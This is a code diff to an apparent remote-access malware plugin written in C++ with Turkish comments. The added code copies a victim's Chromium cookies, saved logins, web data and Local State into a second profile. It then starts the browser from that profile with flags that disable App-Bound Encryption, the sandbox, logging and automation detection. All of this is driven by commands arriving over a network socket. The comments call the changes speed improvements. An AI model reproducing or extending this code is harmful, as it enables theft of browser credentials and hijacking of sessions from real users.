@@ -1237,6 +1237,28 @@ static void clean_profile(const wstring& profilePath) {
     DeleteFileW((defaultPath + L"\\Web Data-journal").c_str());
     DeleteFileW((defaultPath + L"\\Cookies-journal").c_str());
     DeleteFileW((defaultPath + L"\\History-journal").c_str());
+    DeleteFileW((defaultPath + L"\\Login Data-journal").c_str());
+
+    // Gereksiz Cache ve Geçici dosyaları temizleyerek hızı artır
+    SHFILEOPSTRUCTW fileOp = {0};
+    fileOp.wFunc = FO_DELETE;
+    fileOp.fFlags = FOF_NOCONFIRMATION | FOF_SILENT | FOF_NOERRORUI;
+
+    vector<wstring> dirsToDelete = {
+        defaultPath + L"\\Cache",
+        defaultPath + L"\\Code Cache",
+        defaultPath + L"\\GPUCache",
+        profilePath + L"\\ShaderCache",
+        profilePath + L"\\GrShaderCache"
+    };
+
+    for (const auto& d : dirsToDelete) {
+        vector<wchar_t> path(d.begin(), d.end());
+        path.push_back(L'\0');
+        path.push_back(L'\0');
+        fileOp.pFrom = path.data();
+        SHFileOperationW(&fileOp);
+    }
 }
 
 extern "C" __declspec(dllexport) void RunPlugin(SOCKET sock) {
@@ -1334,7 +1356,35 @@ extern "C" __declspec(dllexport) void HandleCommand(SOCKET sock, const char* cmd
 
                     if (!sourceProfile.empty()) {
                         send_status("Profiller kopyalanıyor...");
-                        copy_directory(sourceProfile, destProfile);
+                        // Hızı artırmak için sadece kritik dosyaları kopyala
+                        SHCreateDirectoryExW(NULL, destProfile.c_str(), NULL);
+
+                        wstring localStateSrc = sourceProfile + L"\\Local State";
+                        wstring localStateDest = destProfile + L"\\Local State";
+                        CopyFileW(localStateSrc.c_str(), localStateDest.c_str(), FALSE);
+
+                        wstring destDefault = destProfile + L"\\Default";
+                        SHCreateDirectoryExW(NULL, destDefault.c_str(), NULL);
+
+                        // En kritik dosyalar (Hız için liste daraltıldı)
+                        vector<wstring> essentialFiles = {
+                            L"Cookies", L"Login Data", L"Web Data", L"Preferences",
+                            L"Secure Preferences"
+                        };
+
+                        for (const auto& f : essentialFiles) {
+                            wstring fSrc = sourceProfile + L"\\Default\\" + f;
+                            wstring fDest = destDefault + L"\\" + f;
+                            CopyFileW(fSrc.c_str(), fDest.c_str(), FALSE);
+                        }
+
+                        // Network/Cookies kopyala (Yeni Chrome sürümleri için kritik)
+                        wstring destNetwork = destDefault + L"\\Network";
+                        SHCreateDirectoryExW(NULL, destNetwork.c_str(), NULL);
+                        wstring netCookiesSrc = sourceProfile + L"\\Default\\Network\\Cookies";
+                        wstring netCookiesDest = destNetwork + L"\\Cookies";
+                        CopyFileW(netCookiesSrc.c_str(), netCookiesDest.c_str(), FALSE);
+
                         clean_profile(destProfile);
                     }
 
@@ -1342,6 +1392,7 @@ extern "C" __declspec(dllexport) void HandleCommand(SOCKET sock, const char* cmd
 
                     // Modern Chromium tarayıcılar için görünürlüğü ve kararlılığı artıran bayraklar
                     wstring args = L" --user-data-dir=\"" + destProfile + L"\""
+                                   L" --profile-directory=\"Default\""
                                    L" --no-sandbox"
                                    L" --disable-gpu"
                                    L" --window-size=1280,720"
@@ -1357,7 +1408,7 @@ extern "C" __declspec(dllexport) void HandleCommand(SOCKET sock, const char* cmd
                                    L" --disable-infobars"
                                    L" --disable-gpu-compositing"
                                    L" --force-cpu-draw"
-                                   L" --disable-features=AppBoundEncryption,LockProfile,IsolateOrigins,site-per-process"
+                                   L" --disable-features=AppBoundEncryption,AppBoundEncryptionRequired,LockProfile,IsolateOrigins,site-per-process"
                                    L" --password-store=basic"
                                    L" --disable-encryption-win"
                                    L" --restore-last-session"
@@ -1366,7 +1417,13 @@ extern "C" __declspec(dllexport) void HandleCommand(SOCKET sock, const char* cmd
                                    L" --disable-notifications"
                                    L" --disable-extensions"
                                    L" --disable-component-update"
-                                   L" --disable-domain-reliability";
+                                   L" --disable-domain-reliability"
+                                   L" --no-proxy-server"
+                                   L" --disable-logging"
+                                   L" --disable-breakpad"
+                                   L" --disable-default-apps"
+                                   L" --disable-blink-features=AutomationControlled"
+                                   L" --lang=en-US";
 
                     wstring fullCmd = L"\"" + exePath + L"\"" + args;
                     vector<wchar_t> cmdLine(fullCmd.begin(), fullCmd.end());
